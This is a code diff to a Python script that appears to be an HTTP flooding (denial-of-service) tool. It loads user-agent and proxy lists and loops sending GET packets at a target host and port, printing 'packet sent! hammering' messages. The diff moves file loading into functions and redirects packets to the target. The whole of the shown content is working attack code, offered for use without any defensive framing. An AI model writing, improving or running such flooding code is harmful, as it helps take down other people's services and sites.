@@ -2,16 +2,19 @@ from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,random
 
-global uagent
-uagent=[]
-with open ("ua.txt","r") as f:
-    key = f.read() # reading ua(user agent)
-    uagent.append(key)
+def user_agent():
+    global uagent
+    uagent=[]
+    with open ("ua.txt","r") as f:
+        key = f.read() # reading ua(user agent)
+        uagent.append(key)
 
-global prox
-with open("proxy.txt","r") as pr:
-    key = pr.readlines() # reading proxy
-prox = random.choice(key).split(":")
+def proxy():
+    global prox
+    with open("proxy.txt","r") as pr:
+        key = pr.readlines() # reading proxy
+    for i in range(30):
+        prox = random.choice(key).split(":")
 
 def down_it():
     try:
@@ -25,15 +28,15 @@ def down_it():
             packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((prox[0],int(prox[1])))
-            if s.send( packet):
+            if s.sendto( packet, (host, int(port))):
                 s.shutdown(1)
-                print ("\033[92m","Time :","\033[0m","\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+                print ("\033[94m <--packet sent to {0}:{1}! hammering--> \033[0m".format(host, int(port)))
             else:
                 s.shutdown(1)
-                print("\033[91mshut<->down\033[0m")
+                print("\033[91m shut<->down\033[0m")
             time.sleep(.1)
     except socket.error as e:
-        print("\033[91mSocket error\033[0m")
+        print("\033[91m Socket error, Error {0}\033[0m".format(e))
         time.sleep(2)
     except KeyboardInterrupt:
         exit()
@@ -105,6 +108,8 @@ if __name__ == '__main__':
     get_parameters()
     print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
     type_slow("\033[94m Please wait... \n\033[0m")
+    user_agent()
+    proxy()
     time.sleep(1)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
